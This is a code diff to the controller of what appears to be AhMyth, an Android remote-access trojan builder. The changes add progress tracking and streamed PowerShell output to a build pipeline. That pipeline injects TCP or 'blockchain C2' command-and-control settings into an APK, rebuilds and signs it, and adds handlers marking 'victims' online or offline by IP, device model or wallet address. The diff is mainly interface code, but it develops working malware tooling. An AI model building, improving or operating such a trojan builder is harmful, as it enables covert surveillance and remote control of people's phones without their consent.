@@ -103,7 +103,7 @@ try {
 const {
     promisify
 } = require('util');
-const { exec: execCallback } = require('child_process');
+const { exec: execCallback, spawn } = require('child_process');
 const exec = promisify(execCallback);
 var xml2js = require('xml2js');
 var readdirp = require('readdirp');
@@ -913,6 +913,22 @@ app.controller("AppCtrl", ($scope, $sce) => {
     // Build APK with connection-specific config (TCP or Blockchain)
     $appCtrl.Build = async (ip, port, connectionType, rpcUrl, contract, blockStep, candidates, aesKey, clientKey, chain) => {
         try {
+            // Initialize build progress
+            $appCtrl.buildInProgress = true;
+            $appCtrl.buildComplete = false;
+            $appCtrl.buildError = false;
+            $appCtrl.buildPercent = 0;
+            $appCtrl.buildStatus = 'Initializing build...';
+            $appCtrl.buildSteps = [
+                { label: 'Updating Factory source', active: false, complete: false, error: false },
+                { label: 'Building client APK', active: false, complete: false, error: false },
+                { label: 'Decompiling APK', active: false, complete: false, error: false },
+                { label: 'Injecting configuration', active: false, complete: false, error: false },
+                { label: 'Building final APK', active: false, complete: false, error: false },
+                { label: 'Signing APK', active: false, complete: false, error: false }
+            ];
+            if (!$appCtrl.$$phase) $appCtrl.$apply();
+            
             console.log('\n[APK Builder] ========================================');
             console.log('[APK Builder] Starting APK build process...');
             console.log(`[APK Builder] Connection type: ${connectionType}`);
@@ -928,48 +944,190 @@ app.controller("AppCtrl", ($scope, $sce) => {
             if (fs.existsSync(updateSourceScript)) {
                 try {
                     // Use PowerShell to run the script
-                    const psCommand = `powershell -ExecutionPolicy Bypass -File "${updateSourceScript}"`;
                     console.log('[APK Builder] Building client APK and updating Factory source...');
                     console.log('[APK Builder] This may take a few minutes...');
                     delayedLog('[→] Building client APK and updating Factory source...', CONSTANTS.logStatus.INFO);
                     delayedLog('[ℹ] This may take a few minutes...', CONSTANTS.logStatus.INFO);
                     
-                    const result = await exec(psCommand, { 
-                        cwd: factoryPath,
-                        maxBuffer: 10 * 1024 * 1024, // 10MB buffer for build output
-                        timeout: 600000 // 10 minute timeout for build
-                    });
+                    // Use spawn for real-time output streaming
+                    const allOutput = [];
+                    const allErrors = [];
+                    let lastProgressTime = Date.now();
+                    const progressInterval = 30000; // Show progress every 30 seconds
+                    let progressTimer = null;
                     
-                    // Log output to console and GUI
-                    const allOutput = (result.stdout || '').toString();
-                    if (allOutput) {
-                        const outputLines = allOutput.split('\n').filter(l => l.trim());
-                        if (outputLines.length > 0) {
-                            // Log all output to console
-                            console.log('[APK Builder] Build output:');
-                            outputLines.forEach(line => {
-                                if (line.length > 0 && !line.includes('Profile loaded')) {
-                                    console.log(`  ${line}`);
-                                }
-                            });
+                    const result = await new Promise((resolve, reject) => {
+                        const psProcess = spawn('powershell', [
+                            '-ExecutionPolicy', 'Bypass',
+                            '-File', updateSourceScript
+                        ], {
+                            cwd: factoryPath,
+                            shell: false,
+                            stdio: ['ignore', 'pipe', 'pipe']
+                        });
+                        
+                        let stdoutBuffer = '';
+                        let stderrBuffer = '';
+                        
+                        // Progress heartbeat - show message every 30 seconds if no output
+                        progressTimer = setInterval(() => {
+                            const timeSinceLastOutput = Date.now() - lastProgressTime;
+                            if (timeSinceLastOutput >= progressInterval) {
+                                console.log('[APK Builder] Still building... (this may take several minutes)');
+                                delayedLog('[ℹ] Build in progress... (this may take several minutes)', CONSTANTS.logStatus.INFO);
+                            }
+                        }, progressInterval);
+                        
+                        // Helper function to check if a line is a non-fatal PowerShell warning
+                        const isNonFatalPowerShellWarning = (line) => {
+                            const lower = line.toLowerCase();
+                            return lower.includes('categoryinfo') ||
+                                   lower.includes('fullyqualifiederrorid') ||
+                                   (lower.includes('commandnotfoundexception') && 
+                                    (lower.includes('import-powershelldatafile') || lower.includes('objectnotfound'))) ||
+                                   lower.includes('nullarrayindex') ||
+                                   (lower.includes('index operation failed') && lower.includes('null')) ||
+                                   (lower.includes('cant find') && lower.includes('png')) ||
+                                   (lower.includes('notspecified') && lower.includes('remoteexception'));
+                        };
+                        
+                        // Stream stdout in real-time
+                        psProcess.stdout.on('data', (data) => {
+                            lastProgressTime = Date.now(); // Update last output time
+                            const chunk = data.toString();
+                            stdoutBuffer += chunk;
+                            allOutput.push(chunk);
                             
-                            // Show last few lines in GUI
-                            const lastLines = outputLines.slice(-5);
-                            lastLines.forEach(line => {
-                                const lowerLine = line.toLowerCase();
-                                if (lowerLine.includes('error') || lowerLine.includes('failed') || lowerLine.includes('exception')) {
-                                    delayedLog(`[⚠] ${line.substring(0, 300)}`, CONSTANTS.logStatus.WARNING);
-                                } else if (lowerLine.includes('success') || lowerLine.includes('done') || lowerLine.includes('updated')) {
-                                    delayedLog(`[✓] ${line.substring(0, 300)}`, CONSTANTS.logStatus.SUCCESS);
-                                } else if (lowerLine.includes('building') || lowerLine.includes('decompiling')) {
-                                    delayedLog(`[ℹ] ${line.substring(0, 300)}`, CONSTANTS.logStatus.INFO);
+                            // Process lines as they come
+                            const lines = chunk.split('\n');
+                            lines.forEach(line => {
+                                const trimmed = line.trim();
+                                if (trimmed && !trimmed.includes('Profile loaded')) {
+                                    // Skip non-fatal PowerShell warnings
+                                    if (isNonFatalPowerShellWarning(trimmed)) {
+                                        // Log to console but don't show in GUI
+                                        console.log(`[APK Builder] [PowerShell Warning] ${trimmed}`);
+                                        return;
+                                    }
+                                    
+                                    console.log(`[APK Builder] ${trimmed}`);
+                                    
+                                    const lowerLine = trimmed.toLowerCase();
+                                    if (lowerLine.includes('error') || lowerLine.includes('failed') || lowerLine.includes('exception')) {
+                                        // Double-check it's not a non-fatal warning
+                                        if (!isNonFatalPowerShellWarning(trimmed)) {
+                                            delayedLog(`[⚠] ${trimmed.substring(0, 300)}`, CONSTANTS.logStatus.WARNING);
+                                        }
+                                    } else if (lowerLine.includes('success') || lowerLine.includes('done') || lowerLine.includes('updated') || lowerLine.includes('build successful') || lowerLine.includes('decompilation successful')) {
+                                        delayedLog(`[✓] ${trimmed.substring(0, 300)}`, CONSTANTS.logStatus.SUCCESS);
+                                    } else if (lowerLine.includes('building') || lowerLine.includes('decompiling') || lowerLine.includes('[1/4]') || lowerLine.includes('[2/4]') || lowerLine.includes('[3/4]') || lowerLine.includes('[4/4]')) {
+                                        delayedLog(`[ℹ] ${trimmed.substring(0, 300)}`, CONSTANTS.logStatus.INFO);
+                                    }
                                 }
                             });
-                        }
-                    }
+                        });
+                        
+                        // Stream stderr in real-time (PowerShell often outputs colored text to stderr)
+                        psProcess.stderr.on('data', (data) => {
+                            lastProgressTime = Date.now(); // Update last output time
+                            const chunk = data.toString();
+                            stderrBuffer += chunk;
+                            allErrors.push(chunk);
+                            
+                            // Process stderr lines too (PowerShell colored output goes here)
+                            const lines = chunk.split('\n');
+                            lines.forEach(line => {
+                                const trimmed = line.trim();
+                                if (trimmed && !trimmed.includes('Profile loaded')) {
+                                    // Skip non-fatal PowerShell warnings
+                                    if (isNonFatalPowerShellWarning(trimmed)) {
+                                        // Log to console but don't show in GUI
+                                        console.log(`[APK Builder] [PowerShell Warning] ${trimmed}`);
+                                        return;
+                                    }
+                                    
+                                    console.log(`[APK Builder] ${trimmed}`);
+                                    
+                                    const lowerLine = trimmed.toLowerCase();
+                                    if (lowerLine.includes('error') || lowerLine.includes('failed') || lowerLine.includes('exception')) {
+                                        // Double-check it's not a non-fatal warning
+                                        if (!isNonFatalPowerShellWarning(trimmed)) {
+                                            delayedLog(`[⚠] ${trimmed.substring(0, 300)}`, CONSTANTS.logStatus.WARNING);
+                                        }
+                                    } else if (lowerLine.includes('success') || lowerLine.includes('done') || lowerLine.includes('updated') || lowerLine.includes('build successful') || lowerLine.includes('decompilation successful')) {
+                                        delayedLog(`[✓] ${trimmed.substring(0, 300)}`, CONSTANTS.logStatus.SUCCESS);
+                                    } else if (lowerLine.includes('building') || lowerLine.includes('decompiling') || lowerLine.includes('[1/4]') || lowerLine.includes('[2/4]') || lowerLine.includes('[3/4]') || lowerLine.includes('[4/4]')) {
+                                        delayedLog(`[ℹ] ${trimmed.substring(0, 300)}`, CONSTANTS.logStatus.INFO);
+                                    }
+                                }
+                            });
+                        });
+                        
+                        // Set timeout
+                        const timeoutId = setTimeout(() => {
+                            if (!psProcess.killed) {
+                                if (progressTimer) {
+                                    clearInterval(progressTimer);
+                                }
+                                psProcess.kill();
+                                reject(new Error('Build process timed out after 10 minutes'));
+                            }
+                        }, 600000); // 10 minutes
+                        
+                        psProcess.on('close', (code) => {
+                            // Clear timers
+                            clearTimeout(timeoutId);
+                            if (progressTimer) {
+                                clearInterval(progressTimer);
+                                progressTimer = null;
+                            }
+                            
+                            const combinedOutput = stdoutBuffer + stderrBuffer;
+                            const combinedOutputLower = combinedOutput.toLowerCase();
+                            
+                            // Check for success indicators even if exit code is non-zero
+                            // (PowerShell colored output can cause false errors)
+                            const hasSuccess = combinedOutputLower.includes('build successful') ||
+                                             combinedOutputLower.includes('decompilation successful') ||
+                                             combinedOutputLower.includes('factory source updated successfully') ||
+                                             combinedOutputLower.includes('done! the electron gui builder');
+                            
+                            if (code === 0 || hasSuccess) {
+                                resolve({
+                                    stdout: stdoutBuffer,
+                                    stderr: stderrBuffer,
+                                    code: code
+                                });
+                            } else {
+                                const error = new Error(`Process exited with code ${code}`);
+                                error.stdout = stdoutBuffer;
+                                error.stderr = stderrBuffer;
+                                error.code = code;
+                                reject(error);
+                            }
+                        });
+                        
+                        psProcess.on('error', (error) => {
+                            // Clear timers on error
+                            clearTimeout(timeoutId);
+                            if (progressTimer) {
+                                clearInterval(progressTimer);
+                                progressTimer = null;
+                            }
+                            reject(error);
+                        });
+                    });
                     
                     console.log('[APK Builder] ✓ Factory source updated successfully');
                     delayedLog('[✓] Factory source updated successfully', CONSTANTS.logStatus.SUCCESS);
+                    
+                    // Update progress
+                    $appCtrl.buildSteps[0].complete = true;
+                    $appCtrl.buildSteps[0].active = false;
+                    $appCtrl.buildSteps[1].active = true;
+                    $appCtrl.buildPercent = 20;
+                    $appCtrl.buildStatus = 'Building client APK...';
+                    if (!$appCtrl.$$phase) $appCtrl.$apply();
                 } catch (updateErr) {
                     // Check if the error output actually contains success indicators
                     // PowerShell Write-Host with colors can output to stderr, causing false errors
@@ -1057,6 +1215,22 @@ app.controller("AppCtrl", ($scope, $sce) => {
                 }
             }
 
+            // Update progress - Factory source done, now building
+            $appCtrl.buildSteps[1].complete = true;
+            $appCtrl.buildSteps[1].active = false;
+            $appCtrl.buildSteps[2].active = true;
+            $appCtrl.buildPercent = 40;
+            $appCtrl.buildStatus = 'Decompiling APK...';
+            if (!$appCtrl.$$phase) $appCtrl.$apply();
+            
+            // Update progress - Decompilation done, now injecting config
+            $appCtrl.buildSteps[2].complete = true;
+            $appCtrl.buildSteps[2].active = false;
+            $appCtrl.buildSteps[3].active = true;
+            $appCtrl.buildPercent = 60;
+            $appCtrl.buildStatus = 'Injecting configuration...';
+            if (!$appCtrl.$$phase) $appCtrl.$apply();
+            
             if (connectionType === 'blockchain') {
                 console.log('[APK Builder] Injecting blockchain C2 config...');
                 delayedLog('[→] Injecting blockchain C2 config...', CONSTANTS.logStatus.INFO);
@@ -1076,6 +1250,14 @@ app.controller("AppCtrl", ($scope, $sce) => {
                 await updateIOSocketTcp(ioPath, ip, port);
             }
 
+            // Update progress - Config injected, now building
+            $appCtrl.buildSteps[3].complete = true;
+            $appCtrl.buildSteps[3].active = false;
+            $appCtrl.buildSteps[4].active = true;
+            $appCtrl.buildPercent = 75;
+            $appCtrl.buildStatus = 'Building final APK...';
+            if (!$appCtrl.$$phase) $appCtrl.$apply();
+
             const timestamp = new Date().toISOString().replace(/[:.]/g, '-').split('T');
             const ts = `${timestamp[0]}-${timestamp[1]}`;
             const outApk = `Ahmyth-${ts}.apk`;
@@ -1088,6 +1270,14 @@ app.controller("AppCtrl", ($scope, $sce) => {
             if (buildResult.stdout) {
                 console.log('[APK Builder] Build output:', buildResult.stdout);
             }
+
+            // Update progress - Building done, now signing
+            $appCtrl.buildSteps[4].complete = true;
+            $appCtrl.buildSteps[4].active = false;
+            $appCtrl.buildSteps[5].active = true;
+            $appCtrl.buildPercent = 90;
+            $appCtrl.buildStatus = 'Signing APK...';
+            if (!$appCtrl.$$phase) $appCtrl.$apply();
 
             // Sign
             console.log('[APK Builder] Signing APK...');
@@ -1114,6 +1304,15 @@ app.controller("AppCtrl", ($scope, $sce) => {
                 delayedLog(`[⚠] Could not copy APK to output folder: ${copyErr.message}`, CONSTANTS.logStatus.WARNING);
             }
             
+            // Update progress - Complete!
+            $appCtrl.buildSteps[5].complete = true;
+            $appCtrl.buildSteps[5].active = false;
+            $appCtrl.buildPercent = 100;
+            $appCtrl.buildStatus = 'Build complete!';
+            $appCtrl.buildComplete = true;
+            $appCtrl.buildInProgress = false;
+            if (!$appCtrl.$$phase) $appCtrl.$apply();
+            
             // Store last built path (use output folder path)
             $appCtrl.lastBuiltApkPath = finalApkPath;
             console.log(`[APK Builder] ✓ APK built successfully: ${signedApk}`);
@@ -1126,6 +1325,18 @@ app.controller("AppCtrl", ($scope, $sce) => {
 
             if (!$appCtrl.$$phase) $appCtrl.$applyAsync();
         } catch (e) {
+            // Mark build as failed
+            $appCtrl.buildError = true;
+            $appCtrl.buildInProgress = false;
+            $appCtrl.buildStatus = `Build failed: ${e.message}`;
+            // Mark current active step as error
+            const activeStep = $appCtrl.buildSteps.find(s => s.active);
+            if (activeStep) {
+                activeStep.error = true;
+                activeStep.active = false;
+            }
+            if (!$appCtrl.$$phase) $appCtrl.$apply();
+            
             $appCtrl.Log(`[✗] Build failed: ${e.message}`, CONSTANTS.logStatus.FAIL);
             writeErrorLog(e, 'build.log');
         }
@@ -1138,6 +1349,14 @@ app.controller("AppCtrl", ($scope, $sce) => {
 
     $appCtrl.logs = [];
     $appCtrl.isListen = false;
+    
+    // Build progress tracking
+    $appCtrl.buildInProgress = false;
+    $appCtrl.buildComplete = false;
+    $appCtrl.buildError = false;
+    $appCtrl.buildPercent = 0;
+    $appCtrl.buildStatus = '';
+    $appCtrl.buildSteps = [];
 
     // Get victim count
     $appCtrl.getVictimCount = () => {
@@ -2086,11 +2305,44 @@ app.controller("AppCtrl", ($scope, $sce) => {
 
     // Handle victim going offline (keep in list)
     ipcRenderer.on('SocketIO:VictimOffline', (event, index) => {
-        if (viclist[index]) {
-            const victim = viclist[index];
+        // Handle both index (number) and clientId (string) formats
+        const victim = viclist[index] || (victimsList && victimsList.getVictim(index));
+        if (victim && victim !== -1) {
             victim.isOnline = false;
             victim.lastSeen = Date.now();
-            $appCtrl.Log(`[⚠] Victim went offline: ${victim.ip} (${victim.manf} ${victim.model})`, CONSTANTS.logStatus.WARNING);
+            // Update viclist if using clientId
+            if (!viclist[index] && victimsList) {
+                const allVictims = victimsList.getAllVictims();
+                for (const [id, v] of Object.entries(allVictims)) {
+                    if (id === index || v.id === index) {
+                        viclist[id] = v;
+                        break;
+                    }
+                }
+            }
+            $appCtrl.Log(`[⚠] Victim went offline: ${victim.ip || victim.walletAddress || index} (${victim.manf || ''} ${victim.model || ''})`, CONSTANTS.logStatus.WARNING);
+        }
+        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
+            $appCtrl.$apply();
+        }
+    });
+    
+    ipcRenderer.on('SocketIO:VictimOnline', (event, index) => {
+        // Handle both index (number) and clientId (string) formats
+        const victim = viclist[index] || (victimsList && victimsList.getVictim(index));
+        if (victim && victim !== -1) {
+            victim.isOnline = true;
+            victim.lastSeen = Date.now();
+            // Update viclist if using clientId
+            if (!viclist[index] && victimsList) {
+                const allVictims = victimsList.getAllVictims();
+                for (const [id, v] of Object.entries(allVictims)) {
+                    if (id === index || v.id === index) {
+                        viclist[id] = v;
+                        break;
+                    }
+                }
+            }
         }
         if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
             $appCtrl.$apply();
